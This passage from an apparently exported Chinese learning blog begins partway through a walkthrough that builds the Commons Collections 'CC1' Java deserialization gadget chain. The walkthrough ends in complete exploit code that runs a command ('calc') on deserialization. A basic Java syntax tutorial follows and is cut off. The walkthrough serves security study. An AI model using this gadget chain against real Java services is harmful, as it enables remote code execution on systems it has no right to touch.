objectInputStream.readObject();\n    }\n\n\n}\n```\n\n那么再让我们执行一次 它没有成功 \n\n那么问题出在哪里了呢\n\n## 问题\n\n### 一 \n\nRuntime类并没有Serializable接口 所以无法进行序列化和反序列化\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651832445-20317b70-a0ea-4741-89d1-4938e8510062.png)\n\n所以我们需要通过反射获得它的原型类 原型类Class具有Serializable接口的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695651916837-e8b8d76e-9f07-4fd5-90eb-e9151d360092.png)\n\n它有一个`getRuntime()`方法  注意一下这里是没有参数传入的\n\n可以看到直接返回一个Runtime对象 我们可以利用它来反射调用 \n\n 也就是单列模式![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695652059596-2a448c28-832c-4a01-ac74-9f1d31bdb344.png)\n\n获得可以反序列化的对象和exec方法\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695653868021-b3411c20-86c3-4d6f-9c6a-663813b39b08.png)\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n\n\n\n\n\n\n\n\n\n        Class runtimeReflection = Class.forName(\"java.lang.Runtime\");\n        Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //获得对象\n        Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法\n        //再来获取exec方法\n        Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n//        HashMap<Object, Object> map = new HashMap<>(); //先创建一个map对象\n//        map.put(\"Z1d10t\",\"Z1d10t\");//任意填\n//        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //注意我们这里都是在传一个对象\n////        }\n//        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n//        annotationConstructor.setAccessible(true);\n//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n//        serialize(o);\n//        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\n### 优化\n\n优化为我们一开始的`InvokerTransformer`调用形式\n\n这里直接给transform穿了一个`Runtime.class` 这是一个类对象 本质上也是对象\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //改为InvokerTransformer调用形式\n        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.class注意这里用法\n        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                new Object[]{null, null}).transform(rReflectionMethod);\n        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n\n\n\n\n\n\n\n\n\n        Class runtimeReflection = Runtime.class;\n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //获得对象\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法\n        //再来获取exec方法\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n//        HashMap<Object, Object> map = new HashMap<>(); //先创建一个map对象\n//        map.put(\"Z1d10t\",\"Z1d10t\");//任意填\n//        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //注意我们这里都是在传一个对象\n////        }\n//        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n//        annotationConstructor.setAccessible(true);\n//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n//        serialize(o);\n//        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\n可以看到是一个套一个的形式 有点套娃 那么有没有一个类直接帮我们进行套娃调用呢 \n\n答案是有的`ChainedTransformer`类\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695655664035-d609bad6-2da1-4e83-9e60-013efaa89ca6.png)\n\n构造函数我们需要将我们链式调用的内容数组传进去 然后它的`transform()`就可以帮我们进行链式调用\n\n真是太酷啦\n\n最后优化后的代码\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //改为InvokerTransformer调用形式\n//        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n//        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.class注意这里用法\n//        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n//                new Object[]{null, null}).transform(rReflectionMethod);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n        Transformer[] transformers = new Transformer[]{\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class\n                        ,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                        new Object[]{null, null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        chainedTransformer.transform(Runtime.class);//Runtime.class只有这里是我们可控 其他都是套娃 这里需要理解\n\n\n        //Class runtimeReflection = Runtime.class;\n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //获得对象\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法\n        //再来获取exec方法\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n//        HashMap<Object, Object> map = new HashMap<>(); //先创建一个map对象\n//        map.put(\"Z1d10t\",\"Z1d10t\");//任意填\n//        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null, rlInvokerTransformer);\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //注意我们这里都是在传一个对象\n////        }\n//        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n//        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n//        annotationConstructor.setAccessible(true);\n//        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n//        serialize(o);\n//        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\n记得要将map这里稍加修改一下 对象变了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656279030-c5c4fa98-dd90-4c9b-91e2-838323fea8d0.png)\n\n### 二\n\n记得35行要注释掉\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //改为InvokerTransformer调用形式\n//        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n//        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.class注意这里用法\n//        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n//                new Object[]{null, null}).transform(rReflectionMethod);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n        Transformer[] transformers = new Transformer[]{\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class\n                        ,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                        new Object[]{null, null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        //chainedTransformer.transform(Runtime.class);//Runtime.class只有这里是我们可控 其他都是套娃 这里需要理解\n\n\n        //Class runtimeReflection = Runtime.class;\n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //获得对象\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法\n        //再来获取exec方法\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n        HashMap<Object, Object> map = new HashMap<>(); //先创建一个map对象\n        map.put(\"Z1d10t\",\"Z1d10t\");//任意填\n        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null,chainedTransformer );\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //注意我们这里都是在传一个对象\n////        }\n        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n        annotationConstructor.setAccessible(true);\n        Object o = annotationConstructor.newInstance(Override.class, transformdMap);\n        serialize(o);\n        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\n至此还是执行不了 因为执行`AnnotationInvocationHandler`下的`readObject()`我们有条件没有满足\n\n有两个if语句\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656475842-9c59a2b1-a290-4f18-950f-a4c2b380716f.png)\n\n打两个断点我们调试一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656614798-185efa8a-81cd-45f1-97e0-1dcb2d11d4d8.png)\n\n发现第一个条件`memberType != null`是不满足的 就直接出来了\n\n这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解Override是没有成员变量的 所以得找一个有成员变量的注解\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695656950483-53b96348-5425-422d-a469-e49e1187758f.png)\n\nTarget注解 注意这里value()并不是函数 而是它的属性 学注解的时候有注意到这个\n\n因此要将`Object o = annotationConstructor.newInstance(Override.class, transformdMap);` \n\nOverride改为Target\n\n并且把这块的key改为value\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657243795-18fd1e65-1765-4493-b6e2-d2fe0cbc3ba6.png)\n\n终于进来了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657219389-97bbbae7-153d-4e31-882a-8b5730df1bec.png)\n\n## 三\n\n在setValue的时候，我们传入的value值根本就不是我们需要的Runtime.class\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657573479-621fe54d-1c93-4702-bde2-f209cdf81b42.png)\n\n那么我们应该怎么把他转回我们想要的值呢\n\n这里用到了`ConstantTransformer`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695657728441-bb8f818a-51f2-4d0e-ab7d-02bedce9c460.png)\n\n这个类里面也有transform，和构造函数配合使用的话\n\n无论我们传入什么值，就会返回构造函数传的那个值，这样就能将value的值转为`Runtime.class`\n\n至此所有的链就结束了\n\n最终代码：\n\n```java\npackage com.Z1d10t.dubug;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport javax.xml.crypto.dsig.Transform;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Target;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        //改为InvokerTransformer调用形式\n//        Method rReflectionMethod = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class\n//        ,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);//Runtime.class注意这里用法\n//        Runtime r = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n//                new Object[]{null, null}).transform(rReflectionMethod);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(r);\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class\n                        ,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},\n                        new Object[]{null, null}),\n                new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n        //chainedTransformer.transform(Runtime.class);//Runtime.class只有这里是我们可控 其他都是套娃 这里需要理解\n        Class runtimeReflection = Runtime.class;\n        \n        //Method rReflectionMethod = runtimeReflection.getMethod(\"getRuntime\",null);\n        //获得对象\n        //Runtime r = (Runtime) rReflectionMethod.invoke(null, null);//静态方法无对象 无参方法\n        //再来获取exec方法\n        //Method exec = runtimeReflection.getMethod(\"exec\", String.class);\n        //exec.invoke(r,\"calc\");\n//\n//        //Runtime r = Runtime.getRuntime();\n//\n////        Class<? extends Runtime> runtiomeClass = r.getClass();\n////        Method runtimeMethod = runtiomeClass.getMethod(\"exec\", String.class);\n////        Object invokerObject = runtimeMethod.invoke(r, \"calc\");\n//        InvokerTransformer rlInvokerTransformer = new InvokerTransformer(\"exec\",\n//                new Class[]{String.class}, new Object[]{\"calc\"});\n//        //rlInvokerTransformer.transform(r);\n        HashMap<Object, Object> map = new HashMap<>(); //先创建一个map对象\n        map.put(\"value\",\"Z1d10t\");//任意填\n        Map<Object,Object> transformdMap =TransformedMap.decorate(map, null,chainedTransformer );\n////        for(Map.Entry Entry:transformdMap.entrySet()){\n////            Entry.setValue(r); //注意我们这里都是在传一个对象\n////        }\n        Class<?> annotationClass = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationConstructor = annotationClass.getDeclaredConstructor(Class.class,Map.class);\n        annotationConstructor.setAccessible(true);\n        Object o = annotationConstructor.newInstance(Target.class, transformdMap);\n        serialize(o);\n        unserialize(\"ser.ser\");\n//\n\n    }\n    public static void serialize(Object object) throws Exception{\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(object);\n    }\n    public static void unserialize(String filename) throws Exception{\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\n        objectInputStream.readObject();\n    }\n\n\n}\n```\n\n# 后言：\n\n虽然跟着视频资料一步一步跟过来了 但是还是不太熟悉 还是得多调试多想 \n\n累了 调了几天了 终于结束了\n\n# 感谢：\n\n组长[Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=67f50016dfc916b4c141ffd179381426)\n\n佬文章 [JAVA安全初探(三):CC1链全分析 - 先知社区](https://xz.aliyun.com/t/12669#toc-3)\n","categories":["知识学习"]},{"title":"JAVA基础","url":"/post/43d73074.html","content":"\nJAVA基础\n\n<!--more-->\n\n# IDEA\n\n感觉正式java之旅之前还是要先稍微了解IDEA的基本知识，不然很难进行下去。\n\n## 创建项目前置知识\n\nIDEA中最大的单位应该是project\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434114278-f9c87cd4-0ea5-4145-a87c-2c81ee693b8a.png)\n\n可以理解为是workspace\n\n然后是directory、module和package\n\npackage是JAVA类的命名空间 避免类名重复 \n\n加入我们创建com.Z1d10t 那么就会在本地创建嵌套的文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694440895043-26781dca-312f-4a75-9d22-dd34da27a0c2.png)\n\n这两个层级应该是一样的都是低于project 但是有些差异\n\nmodule一般是我们用于构建源代码的文件夹，用于组织项目的不同部分\n\n而directory是普通文件夹 就比如我们在电脑上普通的文件夹 没有特殊含义\n\n在项目中常常用来放静态音视频图片之类的\n\n然后我们就可以右击我们的module开始创建源文件进行创作了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434659019-af08e6c9-610f-4145-8b84-d9d45b211cb6.png)\n\n## project和module的关系\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694434594830-8437aba0-237d-4d4d-b31c-1d28272fb8ce.png)\n\n## 集成JVM\n\n如果我们不用IDEA进行java开发的话，我们首先是创建`.java`的源代码，然后通过javac.exe来编译为`.class`后缀的文件才可以运行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435200732-04c8c20d-6fb4-4dfd-94fd-6f4eb6eee33f.png)\n\n但是IDEA直接集成了JAVA虚拟机也就是JVM，直接写完帮我们编译然后运行，非常方便。\n\n这也就是为什么java有跨平台性，编译一次到处执行\n\n就是因为JVM的原因，不用去看机器环境，自己就有一个环境，把自己包裹起来的呢种。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435143768-4ba669ca-eaff-448e-8d14-a79f2535b96a.png)\n\n# 基本语法\n\n编写 Java 程序时，应注意以下几点：\n\n- 大小写敏感：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。\n- 类名：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 MyFirstJavaClass，也就是要驼峰式命名。\n- 方法名：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。\n- 源文件名：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 .java。（如果文件名和类名不相同则会导致编译错误）。\n- 主方法入口：所有的 Java 程序由 `public static void main(String[] args) `方法开始执行。\n\n## JAVA标识符\n\n通俗说就是名字，类名变量名方法名都被称为标识符\n\n- 字母数字美元符号或者下划线开头其他非法\n- 关键字不能作为标识符 关键字就是一些已经被java占用的名字 有特殊含义的我们不能用\n- 大小写敏感\n\n## JAVA修饰符\n\n- 访问控制修饰符 : default, public , protected, private\n- 非访问控制修饰符 : final, abstract, static, synchronized\n\n可以用来修饰类中方法和属性\n\n## JAVA变量\n\n- 局部变量\n- 类变量（静态变量）\n- 成员变量（非静态变量）\n\n## JAVA数组\n\n数组是储存在堆上的对象，可以保存多个同类型变量\n\n## JAVA关键字\n\nhttps://www.runoob.com/java/java-basic-syntax.html 遇到了直接查表就行了\n\n## 从HelloWorld开始\n\n```java\npublic class HelloWorld {\n    public static void main(String[] args){\n        System.out.println(\"hello world\");\n    }\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694435638507-27066ea6-5788-41d4-9fdd-1b1fc3c35ce9.png)\n\n首先就是要需要梳理一个理念就是在java中一切都是类 \n\npsvm快捷键可以直接生成 `public static void main(String[] args){}`\n\nsout快捷键可以直接生成`System.out.println(\"hello world\")`\n\n首先我们的文件名是什么那么我们的类名也是什么\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694437426240-3a091928-0f53-45b5-9da4-d93640a78d10.png)\n\n## public class 和 class的区别\n\n也就是说我们可以创建多个类\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694438066917-b9cb277c-c61e-4f07-85ef-d2e71720c87a.png)\n\n但是公共类只能有一个并且公共类的类名必须与文件名保持一致\n\n并且任何类中都可以设置程序入口 也就是都可以写main方法\n\n**但是虽然我们可以在一个java源文件中定义多个类，但是这种做法是不规范的，比较规范的是一个源文件只能定义一个class**\n\n## 注释\n\n```\n//单行注释\n/**/多行注释\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694437533622-d38ce5da-db23-4c92-9786-e71a11b775d5.png)\n\n# JAVA对象和类\n\n## 构造方法\n\n如果没有显式构造方法 java编译器会为该类提供一个默认构造方法\n\n一个类构造方法可以有多个\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694439082703-3fafddcb-d009-470a-89ac-6075109b7f02.png)\n\n## 创建对象\n\n```java\npublic class Student {\n    public Student(String name){\n        System.out.println(\"这是一个学生名为\"+name);\n\n    }\n\n    public static void main(String[] args) {\n        Student stu = new Student(\"byd\");\n\n    }\n}\n```\n\n## 访问实例变量和方法\n\n```java\n/* 实例化对象 */\nObject referenceVariable = new Constructor();\n/* 访问类中的变量 */\nreferenceVariable.variableName;\n/* 访问类中的方法 */\nreferenceVariable.methodName();\n```\n\neg:\n\n```java\npublic class Student {\n    public String LZG= \"byd\";\n    public Student(String name){\n        System.out.println(\"这是一个学生名为\"+name);\n    }\n\n    public static void main(String[] args) {\n        Student stu = new Student(\"byd\");\n        System.out.println(stu.LZG);\n    }\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694440160730-c3d9298a-c2b5-4a40-bd27-289eebedb817.png)\n\n\n\n## import导包\n\n首先在Z1d10t相对路径还有一个learn package\n\n内容如下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694441978087-8f301e62-5397-4bd9-b51d-29e7a4e8f659.png)\n\n然后我们导入到Z1d10t package中\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694442054839-ff85adad-577f-43e0-a5ec-8b4936f135d7.png)\n\n然后调用 可见可以正常输出\n\n## 基本数据类型\n\n有内置数据类型和引用数据类型\n\n### 内置数据类型\n\n用到了直接查\n\nhttps://www.runoob.com/java/java-basic-datatypes.html\n\n### 引用类型\n\n- 在Java中，引用类型的变量非常类似于C/C++的指针。引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。\n- 对象、数组都是引用数据类型。\n- 所有引用类型的默认值都是null。\n- 一个引用变量可以用来引用任何与之兼容的类型。\n- 例子：`Student stu = new Student(\"byd\");`\n\n## 常量\n\n在程序运行时是不能修改的\n\n在java中是用final来修饰变量的\n\n```\nfinal double PI = 3.1415927;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694443639622-ba334d81-5e28-4504-af76-85c64bbd8e1b.png)\n\n## 自动类型转换\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694443848520-a68cb536-1261-4540-bc58-ee0c02520f07.png)\n\n小转大可以 但是大转小需要强制转换并且还会损失精度\n\n# JAVA变量类型\n\n变量类型:\n\n- 局部变量（Local Variables）：定义在方法、构造方法或语句块中的变量，作用域只限于当前方法、构造方法或语句块中。局部变量必须在使用前声明，并且不能被访问修饰符修饰。\n- 成员变量（Instance Variables）：定义在类中、方法之外的变量，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问。成员变量可以被访问修饰符修饰。\n- 静态变量（Class Variables）：定义在类中、方法之外的变量，并且使用 static 关键字修饰，作用域为整个类，可以被类中的任何方法、构造方法和语句块访问，静态变量的值在程序运行期间只有一个副本。静态变量可以被访问修饰符修饰。\n- 参数变量（Parameters）：方法定义时声明的变量，作为调用该方法时传递给方法的值。参数变量的作用域只限于方法内部 简单说就是函数用于传值的形参\n\n## 参数变量\n\n省流：形参\n\n有两个点：\n\n- 值传递：在方法调用时，传递的是实际参数的值的副本。当参数变量被赋予新的值时，只会修改副本的值，不会影响原始值。Java 中的基本数据类型都采用值传递方式传递参数变量的值。\n- 引用传递：在方法调用时，传递的是实际参数的引用（即内存地址）。当参数变量被赋予新的值时，会修改原始值的内容。Java 中的对象类型采用引用传递方式传递参数变量的值。\n\n## 类变量（静态变量）\n\njava中静态变量是属于类的，而不是对象的实例\n\n由于静态变量是与类相关的，因此可以通过类名来访问静态变量，也可以通过实例名来访问静态变量\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694445310175-98a20470-9e06-4a04-8dc0-d3040a499a61.png)\n\n# JAVA修饰符\n\n## 访问控制修饰符\n\n直接用一张图片来看访问权限关系\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694479898379-9130d89e-df79-4522-ab12-76d129bfa1f1.png)\n\n### 默认访问修饰符default\n\n默认访问修饰符的访问级别是包级别（package-level），即只能被同一包中的其他类访问\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694480351100-3b7883b3-58b8-4575-b7d1-1e14edd2a043.png)\n\n### 